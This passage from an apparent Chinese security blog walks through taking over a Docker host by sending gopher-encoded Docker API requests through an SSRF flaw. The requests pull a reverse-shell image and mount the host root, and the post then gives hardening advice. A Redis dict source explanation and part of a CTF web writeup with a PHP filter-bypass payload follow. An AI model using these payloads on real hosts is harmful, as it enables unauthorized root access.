<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /v1.24/images/create?fromImage=imagemlt/reverse_shell HTTP/1.1</span><br><span class="line">Host: localhost:4243</span><br><span class="line">User-Agent: Docker-Client/18.03.1-ce (linux)</span><br><span class="line">Content-Length: 0</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">X-Registry-Auth: e30=</span><br></pre></td></tr></table></figure>
<p>这个post封包的目标是让远程主机从dockerhub下载我们需要的镜像。构造为gopher格式为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://172.17.0.1:4243/_POST%20/v1.24/images/create%3FfromImage%3Dimagemlt/reverse_shell%20HTTP/1.1%0AHost%3A%20localhost%3A4243%0AUser-Agent%3A%20Docker-Client/18.03.1-ce%20%28linux%29%0AContent-Length%3A%200%0AContent-Type%3A%20text/plain%0A X-Registry-Auth:%20e30%3D%0A%0A</span><br></pre></td></tr></table></figure>
<p>通过ssrf的点触发即可在远程服务器下载我们的镜像。<img src="http://image.3001.net/images/20180806/1533549895_5b681d4734a8a.png!small" alt="pull.png"></p>
<p><img src="./pull.png" alt=""></p>
<p>之后再创建容器</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /v1.24/containers/create HTTP/1.1</span><br><span class="line">Host: localhost:4243</span><br><span class="line">User-Agent: Docker-Client/18.03.1-ce (linux)</span><br><span class="line">Content-Length: 99</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;Cmd&quot;:[&quot;your ip&quot;,&quot;3456&quot;],&quot;Image&quot;:&quot;imagemlt/reverse_shell&quot;,&quot;HostConfig&quot;:&#123;&quot;Binds&quot;:[&quot;/:/hostOS&quot;]&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>将封包包装为gopher的形式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://172.17.0.1:4243/_POST%20/v1.24/containers/create%20HTTP/1.1%0AHost%3A%20localhost%3A4243%0AUser-Agent%3A%20Docker-Client/18.03.1-ce%20%28linux%29%0AContent-Length%3A%2099%0AContent-Type%3A%20application/json%0A%0A%7B%22Cmd%22%3A%5B%22your ip%22%2C%223456%22%5D%2C%22Image%22%3A%22imagemlt/reverse_shell%22%2C%22HostConfig%22%3A%7B%22Binds%22%3A%5B%22/%3A/hostOS%22%5D%7D%7D%0A%0d%0a</span><br></pre></td></tr></table></figure>
<p>这里我们再最后多加了一些%0d%0a从而让连接能够断开。然后利用之前的ssrf的地方请求这个url，可以获得创建的容器id：<img src="http://image.3001.net/images/20180806/1533549978_5b681d9a90183.png!small" alt="create.png"></p>
<p><img src="./create.png" alt=""></p>
<p>获取id后我们再post相应的使容器运行的封包：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /v1.24/containers/5a42a09f7bb889f53943015346682388d40a151ec5bad30024282eee11811380/start HTTP/1.1</span><br><span class="line">Host: localhost:4243</span><br><span class="line">User-Agent: Docker-Client/18.03.1-ce (linux)</span><br><span class="line">Content-Length: 0</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure>
<p>我们的服务器端nc端口3456，构造gopher格式的url候再次发送封包：</p>
<p><img src="http://image.3001.net/images/20180806/1533550032_5b681dd030497.png!small" alt="attack.png"><img src="http://image.3001.net/images/20180806/1533550043_5b681ddb80ec8.png!small" alt="getshell.png"></p>
<p><img src="./attack.png" alt="">可以看到服务器端成功返回shell，且已成功挂载宿主机根目录到/hostOS下。</p>
<p><img src="./getshell.png" alt=""></p>
<p>这样我们便通过ssrf与docker未授权api完成了一次攻击，并且获取了宿主机的root权限！</p>
<p>除了反弹shell的方法，我们也可以借助写crontab的方法来获得最后的shell，这里便不再赘述。</p>
<h2 id="如何防范？"><a href="#如何防范？" class="headerlink" title="如何防范？"></a>如何防范？</h2><p>在不必需的情况下，不要启用docker的remote api服务，如果必须使用的话，可以采用如下的加固方式：</p>
<ul>
<li><p>设置ACL，仅允许信任的来源IP连接；</p>
</li>
<li><p>设置TLS认证，官方的文档为Protect the Docker daemon socket</p>
</li>
</ul>
<p>客户端与服务器端通讯的证书生成后，可以通过以下命令启动docker daemon：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -d --tlsverify --tlscacert=ca.pem --tlscert=server-cert.pem --tlskey=server-key.pem -H=tcp://10.10.10.10:2375 -H unix:///var/run/docker.sock</span><br></pre></td></tr></table></figure>
<p>客户端连接时需要设置以下环境变量</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">export DOCKER_TLS_VERIFY=1</span><br><span class="line">export DOCKER_CERT_PATH=~/.docker</span><br><span class="line">export DOCKER_HOST=tcp://10.10.10.10:2375</span><br><span class="line">export DOCKER_API_VERSION=1.12</span><br></pre></td></tr></table></figure>
<p>这样便可以避免未授权的docker api被远程利用。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>未授权的docker remote api具有极大的风险，当结合ssrf漏洞时可以作为渗透测试扩展供给面的工具，最后获得root shell.因此我们做开发时应该严格防范。最后总结一下我们的攻击思路：</p>
<p><img src="http://image.3001.net/images/20180806/1533550066_5b681df2b82f9.png!small" alt="flow.png"></p>
<p><img src="./flow.png" alt=""></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><a href="https://sec.xiaomi.com/article/22">https://sec.xiaomi.com/article/22</a></li>
<li><a href="http://dockone.io/article/401">http://dockone.io/article/401</a></li>
<li><a href="https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2">https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2</a></li>
</ul>

          
        
      
    </div>

    

    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/redis源码-dict-h-dict-c/index.html">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Imagemlt">
      <meta itemprop="description" content="personal blog">
      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Image's blog">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/post/redis源码-dict-h-dict-c/index.html" itemprop="url">
                  redis源码之dict
                </a>
              
            
          </h2>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2018-08-09 22:26:11" itemprop="dateCreated datePublished" datetime="2018-08-09T22:26:11+08:00">2018-08-09</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/技术学习/" itemprop="url" rel="index"><span itemprop="name">技术学习</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="dict-h中的结构体"><a href="#dict-h中的结构体" class="headerlink" title="dict.h中的结构体"></a>dict.h中的结构体</h2><ul>
<li><code>dictEntry</code>结构体</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">dictEntry</span> &#123;</span></span><br><span class="line">    <span class="comment">// 关键字key定义</span></span><br><span class="line">    <span class="keyword">void</span> *key;  </span><br><span class="line">    <span class="comment">// 值value定义，这里采用了联合体，根据union的特点，联合体只能存放一个被选中的成员</span></span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="keyword">void</span> *val;      <span class="comment">// 自定义类型</span></span><br><span class="line">        <span class="keyword">uint64_t</span> u64;   <span class="comment">// 无符号整形</span></span><br><span class="line">        <span class="keyword">int64_t</span> s64;    <span class="comment">// 有符号整形</span></span><br><span class="line">        <span class="keyword">double</span> d;       <span class="comment">// 浮点型</span></span><br><span class="line">    &#125; v;</span><br><span class="line">    <span class="comment">// 指向下一个键值对节点</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dictEntry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; dictEntry;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>dictType</code>结构体</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 定义了字典操作的公共方法，类似于adlist.h文件中list的定义，将对节点的公共操作方法统一定义。搞不明白为什么要命名为dictType */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">dictType</span> &#123;</span></span><br><span class="line">    <span class="comment">/* hash方法，根据关键字计算哈希值 */</span></span><br><span class="line">    <span class="function"><span class="keyword">unsigned</span> <span class="title">int</span> <span class="params">(*hashFunction)</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *key)</span></span>;</span><br><span class="line">    <span class="comment">/* 复制key */</span></span><br><span class="line">    <span class="keyword">void</span> *(*keyDup)(<span class="keyword">void</span> *privdata, <span class="keyword">const</span> <span class="keyword">void</span> *key);</span><br><span class="line">    <span class="comment">/* 复制value */</span></span><br><span class="line">    <span class="keyword">void</span> *(*valDup)(<span class="keyword">void</span> *privdata, <span class="keyword">const</span> <span class="keyword">void</span> *obj);</span><br><span class="line">    <span class="comment">/* 关键字比较方法 */</span></span><br><span class="line">    <span class="keyword">int</span> (*keyCompare)(<span class="keyword">void</span> *privdata, <span class="keyword">const</span> <span class="keyword">void</span> *key1, <span class="keyword">const</span> <span class="keyword">void</span> *key2);</span><br><span class="line">    <span class="comment">/* 销毁key */</span></span><br><span class="line">    <span class="keyword">void</span> (*keyDestructor)(<span class="keyword">void</span> *privdata, <span class="keyword">void</span> *key);</span><br><span class="line">    <span class="comment">/* 销毁value */</span></span><br><span class="line">    <span class="keyword">void</span> (*valDestructor)(<span class="keyword">void</span> *privdata, <span class="keyword">void</span> *obj);</span><br><span class="line">&#125; dictType;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>dictht</code>结构体</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* This is our hash table structure. Every dictionary has two of this as we</span></span><br><span class="line"><span class="comment"> * implement incremental rehashing, for the old to the new table. */</span></span><br><span class="line"><span class="comment">/* 哈希表结构 */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">dictht</span> &#123;</span></span><br><span class="line">    <span class="comment">// 散列数组。哈希表内部是基于数组，数组的元素是dictEntry *类型，所以这里是指针数组。</span></span><br><span class="line">    dictEntry **table;</span><br><span class="line">    <span class="comment">// 散列数组的长度</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> size;</span><br><span class="line">    <span class="comment">// sizemask等于size减1</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> sizemask;</span><br><span class="line">    <span class="comment">// 散列数组中已经被使用的节点数量</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> used;</span><br><span class="line">&#125; dictht;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>dict</code>结构体</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 字典的主操作类，对dictht结构再次包装  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">dict</span> &#123;</span></span><br><span class="line">    <span class="comment">// 字典类型</span></span><br><span class="line">    dictType *type;</span><br><span class="line">    <span class="comment">// 私有数据指针</span></span><br><span class="line">    <span class="keyword">void</span> *privdata;</span><br><span class="line">    <span class="comment">// 一个字典中有两个哈希表，后面的分析中，我们将ht[0]称作就表，ht[1]称作新表</span></span><br><span class="line">    <span class="comment">/*  dict的rehash。通常情况下，所有的数据都是存在放dict的ht[0]中，ht[1]只在rehash的时候使用。</span></span><br><span class="line"><span class="comment">        dict进行rehash操作的时候，将ht[0]中的所有数据rehash到ht[1]中。然后将ht[1]赋值给ht[0]，</span></span><br><span class="line"><span class="comment">        并清空ht[1]。rehash操作我们会在后面详细看到。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    dictht ht[<span class="number">2</span>];</span><br><span class="line">    <span class="comment">// 数据动态迁移的位置，如果rehashidx == -1说明当前没有执行rehash操作</span></span><br><span class="line">    <span class="keyword">long</span> rehashidx; <span class="comment">/* rehashing not in progress if rehashidx == -1 */</span></span><br><span class="line">    <span class="comment">// 当前正在使用的迭代器的数量</span></span><br><span class="line">    <span class="keyword">int</span> iterators; <span class="comment">/* number of iterators currently running */</span></span><br><span class="line">&#125; dict;</span><br></pre></td></tr></table></figure>
<p>四个结构体之间的关系：</p>
<p><img src="http://p7lc13qga.bkt.clouddn.com/dict.jpeg" alt=""></p>
<h2 id="散列函数"><a href="#散列函数" class="headerlink" title="散列函数"></a>散列函数</h2><ul>
<li>Thomas Wang’s 32 bit Mix <code>dictIntHashFunction</code>,对整形取hash</li>
<li>MurmurHash2 by Austin Appleby <code>dictGenHashFunction</code>，对key值与指定长度取hash</li>
<li>case insensitive hash function (based on djb hash) <code>dictGenCaseHashFunction</code> 对字符串进行hash</li>
</ul>
<h2 id="Rehash操作"><a href="#Rehash操作" class="headerlink" title="Rehash操作"></a>Rehash操作</h2><ul>
<li>n步渐进式rehash操作，这是redis的一个亮点，能够将一次rehash分摊到多次数据请求中<ul>
<li><code>_dictRehashStep</code>,每调用一次Rehash一个bucket</li>
<li><code>dictRehashMilliseconds</code> 在一定时间内rehash多个bucket</li>
<li>上面两个函数都调用了<code>dictRehash</code>方法:</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Performs N steps of incremental rehashing. Returns 1 if there are still</span></span><br><span class="line"><span class="comment"> * keys to move from the old to the new hash table, otherwise 0 is returned.</span></span><br><span class="line"><span class="comment"> * Note that a rehashing step consists in moving a bucket (that may have more</span></span><br><span class="line"><span class="comment"> * than one key as we use chaining) from the old to the new hash table. */</span></span><br><span class="line"><span class="comment">/* 执行n步渐进式的rehash操作，如果还有key需要从旧表迁移到新表则返回1，否则返回0 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dictRehash</span><span class="params">(dict *d, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!dictIsRehashing(d)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// n步渐进式的rehash操作就是每次只迁移哈希数组中的n个bucket</span></span><br><span class="line">    <span class="keyword">while</span>(n--) &#123;</span><br><span class="line">        dictEntry *de, *nextde;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Check if we already rehashed the whole table... */</span></span><br><span class="line">        <span class="comment">// 检查是否对整个哈希表进行了rehash操作</span></span><br><span class="line">        <span class="keyword">if</span> (d-&gt;ht[<span class="number">0</span>].used == <span class="number">0</span>) &#123;</span><br><span class="line">            zfree(d-&gt;ht[<span class="number">0</span>].table);</span><br><span class="line">            d-&gt;ht[<span class="number">0</span>] = d-&gt;ht[<span class="number">1</span>];</span><br><span class="line">            _dictReset(&amp;d-&gt;ht[<span class="number">1</span>]);</span><br><span class="line">            d-&gt;rehashidx = <span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Note that rehashidx can't overflow as we are sure there are more</span></span><br><span class="line"><span class="comment">         * elements because ht[0].used != 0 */</span></span><br><span class="line">        <span class="comment">// rehashidx标记的是当前rehash操作进行到了ht[0]旧表的那个位置（下标），因此需要判断它是否操作ht[0]的长度</span></span><br><span class="line">        assert(d-&gt;ht[<span class="number">0</span>].size &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>)d-&gt;rehashidx);</span><br><span class="line">        <span class="comment">// 跳过ht[0]中前面为空的位置</span></span><br><span class="line">        <span class="keyword">while</span>(d-&gt;ht[<span class="number">0</span>].table[d-&gt;rehashidx] == <span class="literal">NULL</span>) d-&gt;rehashidx++;</span><br><span class="line">        de = d-&gt;ht[<span class="number">0</span>].table[d-&gt;rehashidx];</span><br><span class="line">        <span class="comment">/* Move all the keys in this bucket from the old to the new hash HT */</span></span><br><span class="line">        <span class="comment">// 下面的操作将每个节点（键值对）从ht[0]迁移到ht[1],此过程需要重新计算每个节点key的哈希值</span></span><br><span class="line">        <span class="keyword">while</span>(de) &#123;</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> h;</span><br><span class="line"></span><br><span class="line">            nextde = de-&gt;next;</span><br><span class="line">            <span class="comment">/* Get the index in the new hash table */</span></span><br><span class="line">            h = dictHashKey(d, de-&gt;key) &amp; d-&gt;ht[<span class="number">1</span>].sizemask;</span><br><span class="line">            de-&gt;next = d-&gt;ht[<span class="number">1</span>].table[h];</span><br><span class="line">            d-&gt;ht[<span class="number">1</span>].table[h] = de;</span><br><span class="line">            d-&gt;ht[<span class="number">0</span>].used--;</span><br><span class="line">            d-&gt;ht[<span class="number">1</span>].used++;</span><br><span class="line">            de = nextde;</span><br><span class="line">        &#125;</span><br><span class="line">        d-&gt;ht[<span class="number">0</span>].table[d-&gt;rehashidx] = <span class="literal">NULL</span>;</span><br><span class="line">        d-&gt;rehashidx++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

          
        
      
    </div>

    

    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/isitdtuctf-web-writeup/index.html">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Imagemlt">
      <meta itemprop="description" content="personal blog">
      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Image's blog">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/post/isitdtuctf-web-writeup/index.html" itemprop="url">
                  isitdtuctf web writeup
                </a>
              
            
          </h2>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2018-08-02 15:56:42" itemprop="dateCreated datePublished" datetime="2018-08-02T15:56:42+08:00">2018-08-02</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/" itemprop="url" rel="index"><span itemprop="name">Ctf</span></a></span>

                
                
                  , 
                
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>首发于安全客 <a href="https://www.anquanke.com/post/id/153258">https://www.anquanke.com/post/id/153258</a></p>
</blockquote>
<p></p><p>28号的时候师傅们都在打real world ctf，看了一下real world ctf实在玩不动。。。于是就去玩了玩这个越南的ctf比赛的web部分的题目。整体而言这个比赛的web部分的题目偏中等难度，还是比较适合新手的一次练手，部分题目也有一定的新意。这里给出部分题目的writeup。</p><p></p>
<p></p><p> </p><p></p>
<p></p><h2 name="h2-0" id="h2-0">IZ</h2><p></p>
<p><blockquote><p><a href="http://35.185.178.212/">题目地址</a></p></blockquote></p>
<p></p><p>打开题目可以获得题目源码：</p><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> “config.php”;</span><br><span class="line">$number1 = rand(<span class="number">1</span>,<span class="number">100000000000000</span>);</span><br><span class="line">$number2 = rand(<span class="number">1</span>,<span class="number">100000000000</span>);</span><br><span class="line">$number3 = rand(<span class="number">1</span>,<span class="number">100000000</span>);</span><br><span class="line">$url = urldecode($_SERVER[‘REQUEST_URI’]);</span><br><span class="line">$url = parse_url($url, PHP_URL_QUERY);</span><br><span class="line"><span class="keyword">if</span> (preg_match(“/_/i”, $url))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>(“…”);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (preg_match(“/<span class="number">0</span>/i”, $url))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>(“…”);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (preg_match(“/w+/i”, $url))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>(“…”);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($GET[‘‘]) &amp;&amp; !<span class="keyword">empty</span>($GET[‘‘]))</span><br><span class="line">&#123;</span><br><span class="line">$control = $GET[‘‘];</span><br><span class="line"><span class="keyword">if</span>(!in_array($control, <span class="keyword">array</span>(<span class="number">0</span>,$number1)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>(“fail1”);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!in_array($control, <span class="keyword">array</span>(<span class="number">0</span>,$number2)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>(“fail2”);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!in_array($control, <span class="keyword">array</span>(<span class="number">0</span>,$number3)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>(“fail3”);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p></p>
<p></p><p>可以看到题目的逻辑主要是获取query_string后用parse_url处理，处理后的$url再进行过滤，可以看到这里的过滤非常严所以想要绕过过滤还是有一定难度的。<br><br>然而parse_url函数存在一个bug:<br><br>当url的格式为<code>http:/localhost///x.php?key=value</code>的方式可以使其返回<code>False</code><br><br>这样就可以成功绕过之后的三次preg_match的过滤.<br><br>绕过三次preg_match的过滤后程序又进行了三次in_array()判断，而三次in_array()的数组都存在0这样一个元素。而由php弱类型的特性，in_array()在判断时使用的是弱比较，当比较一个字符串和一个数字时默认会尝试把字符串转换为数字，如果字符串的第一个字符不是数字的话则该字符串会被转化成0.具体的转化规则可以参考<a href="http://php.net/manual/zh/language.operators.comparison.php">php.net中的描述</a>。<br><br>因此最终的payload为：</p><p></p>
<p><pre><code>///?_=a<br></code></pre></p>
<p></p><p>访问即可获取flag。</p><p></p>
<p></p><p> </p><p></p>
<p></p><h2 name="h2-1" id="h2-1">Friss</h2><p></p>
<p><blockquote><p><a href="http://35.190.142.60/">题目地址</a></p></blockquote></p>
<p></p><p>题目进去后是一个表单页面：<br><img class="aligncenter" title="curl1" alt="curl1" src="https://p0.ssl.qhimg.com/t0156be5a0c256cebbc.png"></p><p></p>
